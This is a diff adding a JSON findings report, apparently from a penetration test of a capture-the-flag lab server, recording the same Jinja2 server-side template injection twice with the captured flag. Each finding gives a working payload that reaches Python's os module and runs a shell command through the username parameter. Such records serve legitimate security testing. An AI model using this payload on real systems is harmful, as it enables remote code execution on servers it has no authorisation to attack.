@@ -1,0 +1,41 @@
+{
+  "meta": {
+    "created": "2026-04-14T15:52:16.840281+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "08fdacf8-2f00-4c5e-a0cf-249cf3664be8",
+      "timestamp": "2026-04-14T15:52:16.840159+00:00",
+      "title": "Server-Side Template Injection (SSTI) in Jinja2",
+      "severity": "critical",
+      "target": "http://172.17.0.1:53003",
+      "description": "The username query parameter is passed directly to a Jinja2 template without sanitization, allowing arbitrary Python code execution via SSTI.",
+      "evidence": "flag{e7f1e7e4-3abe-4643-9d9e-e64a767bca8b}",
+      "tool_used": "manual_http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "GET http://172.17.0.1:53003/?username={{self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}",
+        "expected": "Response body contains 'Welcome flag{...}!'"
+      }
+    },
+    {
+      "id": "6aca484e-72e9-4e37-9c41-c9e71dcb3e7a",
+      "timestamp": "2026-04-14T15:52:17.013051+00:00",
+      "title": "Server-Side Template Injection (SSTI) in Jinja2",
+      "severity": "critical",
+      "target": "http://172.17.0.1:53003",
+      "description": "The username query parameter is passed directly to a Jinja2 template without sanitization, allowing arbitrary Python code execution via SSTI.",
+      "evidence": "flag{e7f1e7e4-3abe-4643-9d9e-e64a767bca8b}",
+      "tool_used": "manual_http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "GET http://172.17.0.1:53003/?username={{self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}",
+        "expected": "Response body contains 'Welcome flag{...}!'"
+      }
+    }
+  ],
+  "diagrams": []
+}
